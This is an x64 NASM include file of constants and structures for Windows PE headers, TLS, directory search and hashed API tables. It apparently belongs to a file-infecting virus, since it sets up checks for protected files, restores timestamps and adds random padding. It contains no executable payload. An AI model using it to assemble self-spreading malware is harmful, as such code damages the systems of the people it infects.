MAX_PATH                        equ     260

DLL_PROCESS_ATTACH              equ     1
DLL_THREAD_ATTACH               equ     2

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h

GMEM_FIXED                      equ     0000h

OPEN_EXISTING                   equ     3

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

IMAGE_FILE_MACHINE_AMD64        equ     8664h

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

IMAGE_SCN_MEM_EXECUTE           equ     20000000h
IMAGE_SCN_MEM_WRITE             equ     80000000h

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

PAGE_READWRITE                  equ     04

EXCEPTION_CONTINUE_EXECUTION    equ     -1

ContextRecord_RIP               equ     0xf8

align           1                               ;byte-packed structures
struc   ntdcrcstk
        .kntdummy                           : resq  2
        .kRtlRemoveVectoredExceptionHandler : resq  1
        .kRtlAddVectoredExceptionHandler    : resq  1
        .kLdrGetDllHandle                   : resq  1
endstruc
ntdcrc_count    equ     (ntdcrcstk_size - 10h) >> 3

struc   krncrcstk
        .kSfcIsFileProtected  : resq    1       ;appended from other location
        .kUnmapViewOfFile     : resq    1
        .kSetFileTime         : resq    1
        .kSetFileAttributesW  : resq    1
        .kSetCurrentDirectoryW: resq    1
        .kSetCurrentDirectoryA: resq    1
        .kMapViewOfFile       : resq    1
        .kLoadLibraryA        : resq    1
        .kGlobalFree          : resq    1
        .kGlobalAlloc         : resq    1
        .kGetTickCount        : resq    1
        .kGetFullPathNameW    : resq    1
        .kFindNextFileW       : resq    1
        .kFindFirstFileW      : resq    1
        .kFindClose           : resq    1
        .kCreateFileW         : resq    1
        .kCreateFileMappingA  : resq    1
        .kCloseHandle         : resq    1
endstruc
krncrc_count    equ     (krncrcstk_size - 8) >> 3

struc   tlsstruc
        .tlsrawbeg :    resq    1
        .tlsrawend :    resq    1
        .tlsindex  :    resq    1
        .tlsfuncptr:    resq    1
        .tlsfiller :    resd    1
        .tlsflags  :    resd    1
        .tlsfunc   :    resq    2
endstruc

struc   FILETIME
        .dwLowDateTime :resd    1
        .dwHighDateTime:resd    1
endstruc

struc   WIN32_FIND_DATA
        .dwFileAttributes  :    resd    1
        .ftCreationTime    :    resb    FILETIME_size
        .ftLastAccessTime  :    resb    FILETIME_size
        .ftLastWriteTime   :    resb    FILETIME_size
        .dwFileSizeHigh    :    resd    1
        .dwFileSizeLow     :    resd    1
        .dwReserved0       :    resd    1
        .dwReserved1       :    resd    1
        .cFileName         :    resw    260
        .cAlternateFileName:    resw    14
endstruc

struc   findlist
        .findprev:      resq    1
        .findhand:      resq    1
        .finddata:      resb    WIN32_FIND_DATA_size
endstruc

struc   coffhdr
        .pemachine   :  resw    1               ;04
        .pesectcount :  resw    1               ;06
        .petimedate  :  resd    1               ;08
        .pesymbrva   :  resd    1               ;0C
        .pesymbcount :  resd    1               ;10
        .peopthdrsize:  resw    1               ;14
        .peflags     :  resw    1               ;16
endstruc

struc   pedir
        .dirrva :       resd    1
        .dirsize:       resd    1
endstruc

struc   pehdr
        .pesig        : resd    1               ;000
        .pecoff       : resb    coffhdr_size
        .pemagic      : resw    1               ;018
        .pemajorlink  : resb    1               ;01A
        .peminorlink  : resb    1               ;01B
        .pecodesize   : resd    1               ;01C
        .peidatasize  : resd    1               ;020
        .peudatasize  : resd    1               ;024
        .peentrypoint : resd    1               ;028
        .pecodebase   : resd    1               ;02C
        .peimagebase  : resq    1               ;030
        .pesectalign  : resd    1               ;038
        .pefilealign  : resd    1               ;03C
        .pemajoros    : resw    1               ;040
        .peminoros    : resw    1               ;042
        .pemajorimage : resw    1               ;044
        .peminorimage : resw    1               ;046
        .pemajorsubsys: resw    1               ;048
        .peminorsubsys: resw    1               ;04A
        .pereserved   : resd    1               ;04C
        .peimagesize  : resd    1               ;050
        .pehdrsize    : resd    1               ;054
        .pechksum     : resd    1               ;058
        .pesubsys     : resw    1               ;05C
        .pedllflags   : resw    1               ;05E
        .pestackmax   : resq    1               ;060
        .pestacksize  : resq    1               ;068
        .peheapmax    : resq    1               ;070
        .peheapsize   : resq    1               ;078
        .peldrflags   : resd    1               ;080
        .pervacount   : resd    1               ;084
        .peexport     : resb    pedir_size      ;088
        .peimport     : resb    pedir_size      ;090
        .persrc       : resb    pedir_size      ;098
        .peexcpt      : resb    pedir_size      ;0A0
        .pesecurity   : resb    pedir_size      ;0A8
        .pereloc      : resb    pedir_size      ;0B0
        .pedebug      : resb    pedir_size      ;0B8
        .pearch       : resb    pedir_size      ;0C0
        .peglobal     : resb    pedir_size      ;0C8
        .petls        : resb    pedir_size      ;0D0
        .peconfig     : resb    pedir_size      ;0D8
        .pebound      : resb    pedir_size      ;0E0
        .peiat        : resb    pedir_size      ;0E8
        .pedelay      : resb    pedir_size      ;0F0
        .pecom        : resb    pedir_size      ;0F8
        .persrv       : resb    pedir_size      ;100
endstruc

struc   peexp
        .expflags    :  resd    1
        .expdatetime :  resd    1
        .expmajorver :  resw    1
        .expminorver :  resw    1
        .expdllrva   :  resd    1
        .expordbase  :  resd    1
        .expadrcount :  resd    1
        .expnamecount:  resd    1
        .expadrrva   :  resd    1
        .expnamerva  :  resd    1
        .expordrva   :  resd    1
endstruc

struc   mzhdr
        .mzsig     :    resw    1               ;00
        .mzpagemod :    resw    1               ;02
        .mzpagediv :    resw    1               ;04
        .mzrelocs  :    resw    1               ;06
        .mzhdrsize :    resw    1               ;08
        .mzminalloc:    resw    1               ;0A
        .mzmaxalloc:    resw    1               ;0C
        .mzss      :    resw    1               ;0E
        .mzsp      :    resw    1               ;10
        .mzchksum  :    resw    1               ;12
        .mzip      :    resw    1               ;14
        .mzcs      :    resw    1               ;16
        .mzreloff  :    resw    1               ;18
        .mzfiller  :    resb    22h             ;1A
        .mzlfanew  :    resd    1               ;3C
endstruc

struc   pesect
        .sectname     : resb    8
        .sectvirtsize : resd    1
        .sectvirtaddr : resd    1
        .sectrawsize  : resd    1
        .sectrawaddr  : resd    1
        .sectreladdr  : resd    1
        .sectlineaddr : resd    1
        .sectrelcount : resw    1
        .sectlinecount: resw    1
        .sectflags    : resd    1
endstruc

struc   mapsehstk
        .mapsehregs  :  resq    4
        .mapdummy    :  resq    0eh
        .mapsehinfret:  resq    1
endstruc

struc   EXCEPTION_POINTERS
        .ExceptionRecord:       resq    1
        .ContextRecord  :       resq    1
endstruc
align 16                                        ;restore default alignment
